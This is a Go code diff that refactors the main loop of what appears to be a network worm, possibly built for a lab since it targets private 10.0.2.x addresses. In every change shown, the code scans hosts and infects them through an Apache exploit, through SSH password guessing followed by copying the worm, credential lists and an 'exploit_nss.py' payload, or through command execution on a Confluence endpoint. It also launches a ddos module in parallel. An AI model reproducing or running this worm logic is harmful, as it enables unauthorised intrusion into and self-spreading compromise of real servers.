@@ -10,62 +10,47 @@ import (
 	"os"
 )
 
-func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
+func attack(wg *sync.WaitGroup, id int, ip string) {
 	attackerString := fmt.Sprintf("Attacker %d: ",id)
-	//it := 2
-	var ip string
-	var ports [3]int
-	var ipList [5]string
 	
-	ipList[0] = "10.0.2.11"
-	ipList[1] = "10.0.2.12"
-	ipList[2] = "10.0.2.13"
-	ipList[3] = "10.0.2.14"
-	ipList[4] = "10.0.2.15"
-
-	it := 5
-	for i := 0; i < it; i++ {
-		ip = scan.GetRandomIp(baseIp)
-		ip = ipList[i]
-		fmt.Println(attackerString + ip)
-		ports = scan.ScanIp(ip)
-		fmt.Println(ports)
-		infected := false
-		//Apache infect
-		if ports[0] != 0 {
-			if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
-				infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
-				//fmt.Println(infected)
-			}
+	fmt.Println(attackerString + ip)
+	ports := scan.ScanIp(ip)
+	fmt.Println(ports)
+	infected := false
+	//Apache infect
+	if ports[0] != 0 {
+		if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
+			infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
+			//fmt.Println(infected)
 		}
-		//SSH infect
-		if !infected && ports[1] != 0 {
-			ip_port := ip + ":" + strconv.Itoa(ports[1])
-			hit_credentials := infection.GuessSSHConnection(ip_port)
-			if hit_credentials{
-				is_infected := infection.SshCheckInfection(ip_port)
-				fmt.Println(is_infected)
-				if is_infected {
-					continue
-				}
-				message := infection.SshInfect(ip_port, "worm")
-				message = infection.SshInfect(ip_port, "users.txt")
-				message = infection.SshInfect(ip_port, "passwords.txt")
-				//message = infection.SshInfect(ip_port, "slowloris")
-				message = infection.SshInfect(ip_port, "exploit_nss.py")
-				//message = infection.SshInfect(ip_port, "exploit_nss_manual")
-				//fmt.Println(message)
-				message = infection.SshExploit(ip_port)
-				fmt.Println(message)
-				infected = true
+	}
+	//SSH infect
+	if !infected && ports[1] != 0 {
+		ip_port := ip + ":" + strconv.Itoa(ports[1])
+		hit_credentials := infection.GuessSSHConnection(ip_port)
+		if hit_credentials{
+			is_infected := infection.SshCheckInfection(ip_port)
+			fmt.Println(is_infected)
+			if is_infected {
+				return
 			}
-		}
-		//Confluence infect
-		if !infected && ports[2] != 0 {
-			ip_port := ip + ":" + strconv.Itoa(ports[2])
-			infection.ConfluenceCmdExecute("http://" + ip_port , "/pages/createpage-entervariables.action?SpaceKey=x")
+			message := infection.SshInfect(ip_port, "worm")
+			message = infection.SshInfect(ip_port, "users.txt")
+			message = infection.SshInfect(ip_port, "passwords.txt")
+			//message = infection.SshInfect(ip_port, "slowloris")
+			message = infection.SshInfect(ip_port, "exploit_nss.py")
+			//message = infection.SshInfect(ip_port, "exploit_nss_manual")
+			//fmt.Println(message)
+			message = infection.SshExploit(ip_port)
+			fmt.Println(message)
 			infected = true
 		}
+	}
+	//Confluence infect
+	if !infected && ports[2] != 0 {
+		ip_port := ip + ":" + strconv.Itoa(ports[2])
+		infection.ConfluenceCmdExecute("http://" + ip_port , "/pages/createpage-entervariables.action?SpaceKey=x")
+		infected = true
 	}
 	wg.Done()
 }
@@ -79,11 +64,22 @@ func main() {
 	var wg sync.WaitGroup
 	wg.Add(1)
 	go ddos.Hello(&wg,"test")
-	nAttackers := 1
+
+	nAttackers := 5
 	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
+	var ipList [5]string
+
+	ipList[0] = "10.0.2.11"
+	ipList[1] = "10.0.2.12"
+	ipList[2] = "10.0.2.13"
+	ipList[3] = "10.0.2.14"
+	ipList[4] = "10.0.2.15"
+
 	for i := 0; i < nAttackers; i++ {
+		ip := scan.GetRandomIp(baseIp[0])
+		ip = ipList[i]
 		wg.Add(1)
-		go attack(&wg, i, baseIp[i])
+		go attack(&wg, i, ip)
 	}
 	wg.Wait()
 }
